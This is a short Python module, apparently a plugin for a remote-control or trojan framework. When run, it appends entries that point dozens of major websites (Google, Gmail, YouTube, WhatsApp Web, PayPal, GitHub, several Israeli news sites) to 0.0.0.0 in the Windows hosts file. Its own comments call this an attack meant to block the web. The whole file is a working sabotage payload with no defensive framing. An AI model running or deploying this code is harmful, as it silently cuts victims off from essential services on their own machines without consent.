import time
def run(**args):
    #"0.0.0.0 www.github.com\n"\
    #text for to add to file for attack
    dns_attack_text = "\n"\
    "0.0.0.0 www.google.com\n"\
    "0.0.0.0 www.google.co.il\n"\
    "0.0.0.0 www.youtube.com\n"\
    "0.0.0.0 www.twitch.tv\n"\
    "0.0.0.0 www.ynet.co.il\n"\
    "0.0.0.0 www.gmail.com\n"\
    "0.0.0.0 web.whatsapp.com\n"\
    "0.0.0.0 www.facebook.com\n"\
    "0.0.0.0 www.twitter.com\n"\
    "0.0.0.0 www.github.com\n"\
    "0.0.0.0 www.stackoverflow.com\n"\
    "0.0.0.0 www.bing.com\n"\
    "0.0.0.0 www.globes.co.il\n"\
    "0.0.0.0 www.walla.co.il\n"\
    "0.0.0.0 www.ebay.co.il\n"\
    "0.0.0.0 www.ebay.com\n"\
    "0.0.0.0 www.amazon.com\n"\
    "0.0.0.0 www.instagram.com\n"\
    "0.0.0.0 www.wikipedia.org\n"\
    "0.0.0.0 www.msn.com\n"\
    "0.0.0.0 www.linkedin.com\n"\
    "0.0.0.0 www.reddit.com\n"\
    "0.0.0.0 www.netflix.com\n"\
    "0.0.0.0 www.payPal.com\n"\
    "0.0.0.0 www.microsoft.com\n"\
    "0.0.0.0 www.blogspot.com\n"\
    "0.0.0.0 www.imgur.com\n"\
    "0.0.0.0 www.aliexpress.com\n"\
    "0.0.0.0 www.apple.com\n"\
    "0.0.0.0 www.sport5.co.il\n"\
    "0.0.0.0 www.one.co.il\n"\
    "0.0.0.0 www.mako.co.il\n"\
    "0.0.0.0 www.nana10.co.il\n"\
    "0.0.0.0 mail.google.com\n"
     
    try:
        fr = open("C:\Windows\System32\drivers\etc\hosts", "r+")
    #got hosts file
        data = fr.read()
    except:
        return "Unable to open file"
    #read hosts file
    if len(data.split("\n")) > 22:
        return "Hosts file had been previosly modified"
    #check if it had been previos modifications if so exit
    fr.close()
    try:
        fa = open("C:\Windows\System32\drivers\etc\hosts", 'a')
    #modify the file to block the web
        fa.write(str(dns_attack_text))
        fa.close()
    except:
        return "Unable to open file"
    return "Modefied hosts file"
    
    
